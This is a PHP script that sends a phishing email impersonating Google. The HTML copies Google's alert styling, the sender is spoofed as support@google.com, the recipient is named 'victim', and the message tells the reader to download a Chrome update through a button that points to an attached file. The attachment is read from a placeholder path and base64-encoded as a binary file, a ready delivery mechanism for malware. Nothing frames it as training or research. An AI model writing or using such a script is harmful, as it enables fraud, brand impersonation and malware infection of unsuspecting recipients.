<?php
$to = "victim@gmail.com";
$subject = "Urgent: Your Chrome Browser is Outdated";

// HTML message body with an attachment
$messageHTML = '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="format-detection" content="date=no">
    <meta name="format-detection" content="email=no">
    <meta charset="UTF-8">
    <title>Update Chrome Browser</title>
</head>

<body style="margin: 0; padding: 0;" bgcolor="#FFFFFF">
    <table width="100%" height="100%" style="min-width: 348px;" border="0" cellspacing="0" cellpadding="0">
        <tr height="32px"></tr>
        <tr align="center">
            <td width="32px"></td>
            <td>
                <table border="0" cellspacing="0" cellpadding="0" style="max-width: 600px;">
                    <tr>
                        <td>
                            <table bgcolor="#4184F3" width="100%" border="0" cellspacing="0" cellpadding="0" style="min-width: 332px; max-width: 600px; border: 1px solid #E0E0E0; border-bottom: 0; border-top-left-radius: 3px; border-top-right-radius: 3px;">
                                <tr>
                                    <td height="72px" colspan="3"></td>
                                </tr>
                                <tr>
                                    <td width="32px"></td>
                                    <td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 24px; color: #FFFFFF; line-height: 1.25;">
                                        Urgent: Your Chrome Browser is Outdated!
                                    </td>
                                    <td width="32px"></td>
                                </tr>
                                <tr>
                                    <td height="18px" colspan="3"></td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <table bgcolor="#FAFAFA" width="100%" border="0" cellspacing="0" cellpadding="0" style="min-width: 332px; max-width: 600px; border: 1px solid #F0F0F0; border-bottom: 1px solid #C0C0C0; border-top: 0; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px;">
                                <tr height="16px">
                                    <td width="32px" rowspan="3"></td>
                                    <td></td>
                                    <td width="32px" rowspan="3"></td>
                                </tr>
                                <tr>
                                    <td>
                                        <table style="min-width: 300px;" border="0" cellspacing="0" cellpadding="0">
                                            <tr>
                                                <td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202020; line-height: 1.5;">
                                                    Hi,
                                                </td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202020; line-height: 1.5;">
                                                    Your version of <span style="white-space:nowrap;">Google Chrome</span> is out of date. For your security, we recommend updating your browser to the latest version. Please click the button below to download and update your Chrome browser.
                                                </td>
                                            </tr>
                                            <tr>
                                                <td style="text-align: center;">
                                                    <a href="cid:attachment_id" style="display: inline-block; padding: 12px 20px; background-color: #4285F4; color: #ffffff; text-decoration: none; border-radius: 5px; font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; margin-top: 48px; margin-bottom: 48px;">
                                                        Download Chrome Now
                                                    </a>
                                                </td>
                                            </tr>
                                            <tr height="10px"></tr>
                                            <tr>
                                                <td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202020; line-height: 1.5;">
                                                    Staying up to date is essential to your security and privacy online. Please take a moment to ensure your browser is updated.
                                                </td>
                                            </tr>
                                            <tr height="32px"></tr>
                                            <tr>
                                                <td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202020; line-height: 1.5;">
                                                    Best,<br>The Google Chrome team<br><br> <!-- Added an extra <br> for space -->
                                                    *The location is approximate and determined by the IP address it was coming from.<br>
                                                    This email can&apos;t receive replies. To give us feedback on this alert, <a href="https://support.google.com/accounts/">click here</a>. For more information, visit the <a href="https://support.google.com/accounts/">Google Accounts Help Center</a>.<br>
                                                    © Google 2024. All rights reserved.
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                                <tr height="32px"></tr>
                            </table>
                        </td>
                    </tr>
                </table>
            </td>
            <td width="32px"></td>
        </tr>
        <tr height="32px"></tr>
    </table>
</body>
</html>';

// File to attach
$file = 'path/to/attachment.txt'; // Replace with the actual file path

// Read the file content
$file_content = chunk_split(base64_encode(file_get_contents($file)));
$filename = basename($file);

// Generate a boundary for separating email parts
$boundary = md5(time());

// Email headers
$headers = "MIME-Version: 1.0\r\n";
$headers .= "From: Hazwan <support@google.com>\r\n";
$headers .= "Reply-To: support@google.com\r\n";
$headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";

// Plain text part
$messagePlain = "This is the plain text version of the email.\nYour browser does not support HTML emails.";

// Body of the email
$body = "--$boundary\r\n";
$body .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
$body .= "$messagePlain\r\n";

// HTML version
$body .= "--$boundary\r\n";
$body .= "Content-Type: text/html; charset=UTF-8\r\n\r\n";
$body .= "$messageHTML\r\n";

// Attachment part
$body .= "--$boundary\r\n";
$body .= "Content-Type: application/octet-stream; name=\"$filename\"\r\n";
$body .= "Content-Disposition: attachment; filename=\"$filename\"\r\n";
$body .= "Content-Transfer-Encoding: base64\r\n\r\n";
$body .= "$file_content\r\n";
$body .= "--$boundary--";

// Send email
if (mail($to, $subject, $body, $headers)) {
    echo "Email sent successfully with attachment!";
} else {
    echo "Failed to send email.";
}
?>
